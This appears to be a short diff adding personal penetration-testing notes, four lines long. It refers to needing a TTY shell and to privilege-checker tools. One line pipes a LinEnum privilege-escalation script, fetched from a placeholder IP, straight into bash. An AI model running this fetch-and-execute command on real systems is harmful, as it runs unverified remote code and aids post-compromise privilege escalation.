@@ -1,0 +1,4 @@
+Only in tty shell 
+
+or privchecker
+curl IP/LinEnum.sh | bash
